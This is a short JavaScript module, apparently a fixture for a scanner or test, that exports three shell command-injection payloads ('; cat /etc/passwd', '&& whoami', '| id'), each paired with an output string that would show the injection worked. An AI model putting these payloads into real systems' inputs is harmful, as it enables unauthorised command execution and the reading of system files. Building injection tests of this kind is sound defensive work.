module.exports = [
  { payload: "; cat /etc/passwd", indicator: "root:x:0:0:" },
  { payload: "&& whoami", indicator: "nt authority\\system" },
  { payload: "| id", indicator: "uid=" }
];
